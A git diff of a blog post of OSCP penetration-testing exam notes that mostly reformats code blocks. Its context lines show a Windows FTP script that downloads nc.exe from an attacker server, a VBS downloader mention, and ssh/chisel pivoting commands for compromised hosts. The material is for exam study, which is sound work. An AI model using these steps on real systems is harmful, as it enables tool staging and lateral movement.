@@ -1,6 +1,6 @@
 Title: My notes regarding OSCP exam
 Category: OSCP
-Tags: cheatsheet, exam
+Tags: cheatsheet, exam, oscp, pwk, unix, windows, htb
 Summary: Some references, cheatsheets and thoughts about PWK in general
 Date: 17/08/2020 23:00
 Modified: 2020-09-06 15:00
@@ -566,7 +566,7 @@ Some useful approaches:
     systemctl restart pure-ftpd
 ```
  * Connect from windows using FTP script file. The main caveat is the lack of space character after user and password:
-<pre>
+```text
 echo open &lt;SRVADDR&gt; > ftp.txt
 echo ftpuser>> ftp.txt
 echo ftppass>> ftp.txt
@@ -574,7 +574,7 @@ echo bin >> ftp.txt
 echo get nc.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -s:ftp.txt
-</pre>
+```
  * There's a useful impacket script to run simple SMB server: `python smbserver.py sharename /foo/bar/baz.exe`
  * Handy batch script to drop VBS scenario that may download files from web server. Invoke as `cscript wget.vbs <URI> <OUTFILE>`:
 ```batch
@@ -757,8 +757,7 @@ technique. Tools include:
 Another familiar section, all about port redirections and establishing pivots through compromised boxes. 
 Tools include `ssh` (swiss knife), [sshuttle](https://github.com/sshuttle/sshuttle), `rinetd`, `chisel`, `plink.exe`, `netsh`, 
 `proxychains`, `httptunnel`, `stunnel` and some modules from `beef framework`. Some useful commands:
-
-<pre>
+```text
 
     # ssh local port forwarding
     ssh -N -L LPORT:RHOST:RPORT SSHSRV
@@ -795,8 +794,7 @@ Tools include `ssh` (swiss knife), [sshuttle](https://github.com/sshuttle/sshutt
     # chisel usage: set server and connect client
     chisel server -P LPORT --socks5 --key KEY
     chisel client RHOST:RPORT socks # connect to remote server on LPORT from above
-
-</pre>
+```
 
 When in doubt and need some pics, go to the [abatchy's post on this](https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide)
 or [this one](https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/)
